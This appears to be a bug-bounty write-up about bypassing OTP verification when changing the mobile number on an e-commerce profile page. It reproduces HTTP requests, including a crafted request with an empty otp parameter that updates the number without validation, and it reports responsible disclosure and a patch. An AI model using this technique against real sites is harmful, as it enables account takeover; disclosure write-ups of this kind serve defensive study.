---
layout: post
title: How I bypassed OTP mechanism used for updating Sensitive Information
---
I found this vulnerability in a ecommerce site, the site has a responsible disclosure program

So the vulnerability was in profile<!--more--> updation page, there was a form by which a user can update his/her details, the details also includes `Mobile Number`, when a user tried to update any other detail it was updated normally but when user click on Edit button at `Mobile Number` field, OTP is sent to the registered email, and a popup occurs asking for the OTP, after entering OTP the number field can be enabled and updated

**OTP Validation Request**

```
POST /customer/otp-val HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 85
Connection: close
Cookie: --COOKIES--

otp=123456&type=profile_update_otp&formId=myAccountVerifyOTPForm&mobile_no=NUMBERHERE
```

**Data Updation Request**

```
POST /customer/account HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 222
Connection: close
Cookie: --COOKIES--
Upgrade-Insecure-Requests: 1

csrf_token=--CSRFTOKEN--&save_profile=Save+Changes&otp=123456&fname=Test&lname=Test&mobile=NUMBERHERE
```
## Where is the problem in this flow

There is two different requests one is validating the OTP, and enabling the number field, and another is when actually after updating the number a request is sent with Save button to save the number on the server

There is `otp` parameter in both the requests but the application is completely dependent on the first request, and in the second request the `otp` parameter is not validated

## Exploitation

As mentioned earlier that if user try to update any other field the data updation request is sent which also contains `Mobile Number`

So I clicked on edit `Name` and intercepted the request with burp suite, changed the `mobile` parameter with whatever number and send the request

**Malicious Requests** //Empty `otp` parameter
```
POST /customer/account HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 222
Connection: close
Cookie: --COOKIES--
Upgrade-Insecure-Requests: 1

csrf_token=--CSRFTOKEN--&save_profile=Save+Changes&otp=&fname=Test&lname=Test&mobile=NUMBERHERE
```

The Mobile number is updated without any validation

The vulneraility is now patched

**Time Frame**

Intial Report: 27-May-2020

First Response: 27-May-2020

Patch Released: 2-June-2020
